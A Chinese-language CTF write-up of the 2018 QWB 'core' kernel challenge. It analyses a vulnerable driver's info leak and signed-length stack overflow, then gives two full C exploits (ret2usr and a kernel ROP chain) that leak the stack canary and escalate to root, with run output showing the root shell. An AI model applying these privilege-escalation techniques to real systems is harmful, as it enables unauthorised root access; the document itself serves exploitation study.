# 2018QWB-core

## 信息收集

start.sh qemu启动脚本如下（这里`-m`分配内存改大一点如128M，否则运行时会报错）：

```shell
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

可见未开启 smep 保护，但开启了kaslr。

提取文件系统后查看目标驱动和内核保护：

```shell
$ checksec core.ko
[*] '/home/ivan/kernel/core/give_to_player/output/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
$ checksec vmlinux
[*] '/home/ivan/kernel/core/give_to_player/output/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
```

init 系统启动脚本如下：

```shell
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms #get commit_creds prepare_kernel_cred address
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

脚本中虽然开启了`kptr_restrict`并且禁用了`dmesg`，看似不能获得提权函数`commit_creds`和`prepare_kernel_cred` 的地址。但在这之前将`/proc/kallsyms`中的内容移到了`/tmp/kallsyms`，这样就可以用命令`cat /tmp/kallsyms | grep "commit_creds"`获取提权所需函数的地址。

查看目标内核版本：

```shell
$ sudo ./start.sh 
[    0.022799] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ cat /proc/version 
Linux version 4.15.8 (simple@vps-simple) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC)) #19 SMP Mon Mar 19 18:50:28 CST 2018
```

## 关键函数分析&漏洞点

将 core.ko 拖入 ida 分析：

`core_ioctl()` ：主要功能有调用函数 `core_read()`、`core_copy_func()` 以及设置全局变量`off`

```c
__int64 __fastcall core_ioctl(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a3;
  switch ( (_DWORD)a2 )
  {
    case 0x6677889B:
      core_read(a3, a2);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n", a3);
      off = v3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n", a2);
      core_copy_func(v3, a2);
      break;
  }
  return 0LL;
}
```

`core_read()`：会根据`core_ioctl()`设置的 `off`偏移读出栈上 0x40 的数据,而 `off` 值又未做限制，可借此泄露函数返回地址、canary 值等

```c
unsigned __int64 __fastcall core_read(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 *v3; // rdi
  signed __int64 i; // rcx
  unsigned __int64 result; // rax
  __int64 v6; // [rsp+0h] [rbp-50h]
  unsigned __int64 v7; // [rsp+40h] [rbp-10h]

  v2 = a1;
  v7 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n", a2);
  printk("\x016%d %p\n", off);
  v3 = &v6;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v3 = 0;
    v3 = (__int64 *)((char *)v3 + 4);
  }
  strcpy((char *)&v6, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(v2, (char *)&v6 + off, 64LL);  //info leak
  if ( !result )
    return __readgsqword(0x28u) ^ v7;
  __asm { swapgs }
  return result;
}
```

`core_copy_func()`：根据用户输入长度，从`name`向栈上拷贝数据。由于`a1`在传入函数时类型为 `signed __int64`，而在检查的时候只检查了上界忽略了`a1`小于0的情况，在拷贝时又将`a1`强转为`unsigned __int16`。只要构造如 `a1=0xffffffffffff0000|(0x100)`,即可绕过检查造成栈溢出。

```c
signed __int64 __fastcall core_copy_func(signed __int64 a1, __int64 a2)
{
  signed __int64 result; // rax
  __int64 v3; // [rsp+0h] [rbp-50h]
  unsigned __int64 v4; // [rsp+40h] [rbp-10h]

  v4 = __readgsqword(0x28u);
  printk(&a6coreCalledCor_0, a2);
  if ( a1 > 63 )
  {
    printk(&a6detectOverflo, a2);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&v3, &name, (unsigned __int16)a1);//overflow
  }
  return result;
}
```

`core_write()`：用户可以向全局变量`name`中写入一个不大于0x800的字符串内容

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx

  v3 = a3;
  printk("\x016core: called core_writen", a2);
  if ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )
    return (unsigned int)v3;
  printk("\x016core: error copying data from userspacen", a2);
  return 0xFFFFFFF2LL;
}
```

## 方法一

由于本题目没有开启 smep 故可以使用 ret2usr。ret2usr 攻击利用了 **用户空间的进程不能访问内核空间，但内核空间能访问用户空间** 这个特性来定向内核代码或数据流指向用户控件，以 `ring 0` 特权执行用户空间代码完成提权等操作。

为了方便调试我们可以先把 kaslr 关闭：

```shell
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr" \
```

也可以在启动后：`cat /sys/module/core/sections/.text`确定基地址后再下断点调试。

### 利用思路：

- 通过读取 `/tmp/kallsyms` 获取 `commit_creds` 和 `prepare_kernel_cred`。
- 通过 `core_ioctl()`设置`off`，之后再通过`core_read()`泄露出canary ，canary偏移如下：

```shell
pwndbg> stack 50
00:0000│ rax rsp  0xffffc900000dfe18 ◂— 'Welcome to the QWB CTF challenge.\n'
01:0008│          0xffffc900000dfe20 ◂— 'to the QWB CTF challenge.\n'
02:0010│          0xffffc900000dfe28 ◂— 'WB CTF challenge.\n'
03:0018│          0xffffc900000dfe30 ◂— 'hallenge.\n'
04:0020│          0xffffc900000dfe38 ◂— 0xa2e /* '.\n' */
05:0028│          0xffffc900000dfe40 ◂— 0x0
... ↓
08:0040│ rsi      0xffffc900000dfe58 ◂— 0x8d626a24e68f4d00 #canary
09:0048│          0xffffc900000dfe60 —▸ 0x7ffcc81d6520 ◂— 0
0a:0050│          0xffffc900000dfe68 —▸ 0xffffffffc000019b (core_ioctl+60) ◂— jmp    0xffffffffc00001b5 /* 0xc7c748d6894818eb */ 
```

-  确定返回地址偏移后，直接返回到用户空间构造的 `commit_creds(prepare_kernel_cred(0))` 实现提权，虽然这两个函数位于内核空间，但此时是 `ring 0` 特权，因此可以正常运行，之后通过 `swapgs; iretq` 返回到用户态来执行用户空间的 shell 。以此为思路构造 ROPChain，通过`core_write()`向 `name`写入 ROPChain。
-  通过`core_copy_func()`从 `name` 向局部变量上写，在函数结束时触发溢出，执行ROP链。

运行结果如下：

```shell
$ sudo ./start.sh 
[sudo] password for ivan: 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
[    0.029343] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ id
uid=1000(chal) gid=1000(chal) groups=1000(chal)
/ $ ./poc1
[*] commit_creds addr: 0xffffffff9a69c8e0
[*] vmlinux_base addr: 0xffffffff9a600000
[*] prepare_kernel_cred addr: 0xffffffff9a69cce0
[.] saving status...
[*] status has been saved
[.] leaking canary ...
[.] set off: 0x40
[.] reading buf ...
[*] canary:0x29f250025473c000
[.] copying from user: 0xffffffffffff0180
[*] shell?
/ # id
uid=0(root) gid=0(root)
/ # 
```

### exp:

```c
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define DEV_CORE "/proc/core"

#define KERNELCALL __attribute__ ((regparm(3)))
void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;

void info(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[.] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void fail(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[x] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
        info("saving status...\n");
        __asm__("mov user_cs, cs;"
                        "mov user_ss, ss;"
                        "mov user_sp, rsp;"
                        "pushf;"
                        "pop user_rflags;"
                        );
        msg("status has been saved\n");
}

void get_shell(){
        msg("shell?\n");
        char *shell = "/bin/sh";
        char *args[] = {shell,NULL};
        execve(shell,args,NULL);
}

size_t commit_creds_addr=0,prepare_kernel_cred_addr=0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;

void get_root(){
	commit_creds = commit_creds_addr;
	prepare_kernel_cred = prepare_kernel_cred_addr;
	commit_creds(prepare_kernel_cred(0));
}


void find_symbols(){
	FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
	char buf[0x30]={0};

	if(kallsyms_fd < 0){
		fail("open kallsyms error!\n");
		exit(0);
	}
	while(fgets(buf, 0x30, kallsyms_fd)){
		if(commit_creds_addr & prepare_kernel_cred_addr)
			return;
		if(strstr(buf,"commit_creds") && !commit_creds_addr){
			char hex[20]={0};
			strncpy(hex,buf,16);
			sscanf(hex,"%lx",&commit_creds_addr);
			msg("commit_creds addr: %p\n", commit_creds_addr);
			vmlinux_base = commit_creds_addr - 0x9c8e0;
			msg("vmlinux_base addr: %p\n", vmlinux_base);
		}
		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred_addr){
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%lx", &prepare_kernel_cred_addr);
			msg("prepare_kernel_cred addr: %p\n", prepare_kernel_cred_addr);
			vmlinux_base = prepare_kernel_cred_addr - 0x9cce0;
		}
	}
	if(!(prepare_kernel_cred_addr & commit_creds_addr)){
		fail("error !\n");
		exit(0);
	}
}

void set_off(int fd,size_t idx){
	info("set off: 0x%lx\n",idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd,char* buf){
	info("reading buf ...\n");
	ioctl(fd, 0x6677889B, buf);
}

void core_copy_func(int fd,size_t size){
	info("copying from user: 0x%lx\n",size);
	ioctl(fd, 0x6677889A, size);
}

size_t swapgs = 0xffffffff81a012da; //swapgs; popfq; ret;
size_t iretq = 0xffffffff81050ac2; //iretq; ret;

int main(){
	
	find_symbols();
	size_t offset = vmlinux_base - raw_vmlinux_base;
	save_status();

	int fd = open(DEV_CORE,O_RDWR);
	info("leaking canary ...\n");
	set_off(fd,0x40);
	size_t buf[0x40]={0};
	core_read(fd,buf);
	size_t canary = buf[0];
	msg("canary:%p\n", canary);

	size_t rop[0x30]={0};
	rop[8] = canary;
	rop[10] = (size_t)get_root;
	rop[11] = swapgs + offset;
	rop[12] = 0;
	rop[13] = iretq + offset;
	rop[14] = (size_t)get_shell;
	rop[15] = user_cs;
	rop[16] = user_rflags;
	rop[17] = user_sp;
	rop[18] = user_ss;

	write(fd,rop,0x30*8);
	core_copy_func(fd,0xffffffffffff0000|(0x30*8));

	return 0;
}
```



## 方法二

可以通过内核空间的 rop 达到执行 `commit_creds(prepare_kernel_cred(0))` 以提权目的，之后通过 `swapgs; iretq` 等返回到用户态获取 shell。

### exp：

```c
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define DEV_CORE "/proc/core"

#define KERNELCALL __attribute__ ((regparm(3)))
void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;

void info(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[.] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void fail(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[x] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
        info("saving status...\n");
        __asm__("mov user_cs, cs;"
                        "mov user_ss, ss;"
                        "mov user_sp, rsp;"
                        "pushf;"
                        "pop user_rflags;"
                        );
        msg("status has been saved\n");
}

void get_shell(){
        msg("shell?\n");
        char *shell = "/bin/sh";
        char *args[] = {shell,NULL};
        execve(shell,args,NULL);
}

size_t commit_creds_addr=0,prepare_kernel_cred_addr=0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;

/*void get_root(){
	commit_creds = commit_creds_addr;
	prepare_kernel_cred = prepare_kernel_cred_addr;
	commit_creds(prepare_kernel_cred(0));
}*/


void find_symbols(){
	FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
	char buf[0x30]={0};

	if(kallsyms_fd < 0){
		fail("open kallsyms error!\n");
		exit(0);
	}
	while(fgets(buf, 0x30, kallsyms_fd)){
		if(commit_creds_addr & prepare_kernel_cred_addr)
			return;
		if(strstr(buf,"commit_creds") && !commit_creds_addr){
			char hex[20]={0};
			strncpy(hex,buf,16);
			sscanf(hex,"%lx",&commit_creds_addr);
			msg("commit_creds addr: %p\n", commit_creds_addr);
			vmlinux_base = commit_creds_addr - 0x9c8e0;
			msg("vmlinux_base addr: %p\n", vmlinux_base);
		}
		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred_addr){
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%lx", &prepare_kernel_cred_addr);
			msg("prepare_kernel_cred addr: %p\n", prepare_kernel_cred_addr);
			vmlinux_base = prepare_kernel_cred_addr - 0x9cce0;
		}
	}
	if(!(prepare_kernel_cred_addr & commit_creds_addr)){
		fail("error !\n");
		exit(0);
	}
}

void set_off(int fd,size_t idx){
	info("set off: 0x%lx\n",idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd,char* buf){
	info("reading buf ...\n");
	ioctl(fd, 0x6677889B, buf);
}

void core_copy_func(int fd,size_t size){
	info("copying from user: 0x%lx\n",size);
	ioctl(fd, 0x6677889A, size);
}
size_t pop_rdi = 0xffffffff81000b2f; //pop rdi; ret;
size_t pop_rdx = 0xffffffff810a0f49; //pop rdx; ret;
size_t pop_rcx = 0xffffffff81021e53; //pop rcx; ret;
size_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;// mov rdi, rax; call rdx;

size_t swapgs = 0xffffffff81a012da;  //swapgs; popfq; ret;
size_t iretq = 0xffffffff81050ac2;   //iretq; ret;

int main(){
	
	find_symbols();
	size_t offset = vmlinux_base - raw_vmlinux_base;
	save_status();

	int fd = open(DEV_CORE,O_RDWR);
	info("leaking canary ...\n");
	set_off(fd,0x40);
	size_t buf[0x40]={0};
	core_read(fd,buf);
	size_t canary = buf[0];
	msg("canary:%p\n", canary);

	size_t rop[0x30]={0};
	int i=8;
	rop[i] = canary;
	rop[i++] = canary;
	rop[i++] = canary;
	rop[i++] = pop_rdi+offset;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred_addr;
	rop[i++] = pop_rdx+offset;
	rop[i++] = pop_rcx+offset;
	rop[i++] = mov_rdi_rax_call_rdx+offset;
	rop[i++] = commit_creds_addr;
	rop[i++] = swapgs+offset;
	rop[i++] = 0;
	rop[i++] = iretq + offset;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	write(fd,rop,0x30*8);
	core_copy_func(fd,0xffffffffffff0000|(0x30*8));

	return 0;
}
```



## 参考资料

[1] https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/

[2] http://p4nda.top/2018/07/13/ciscn2018-core/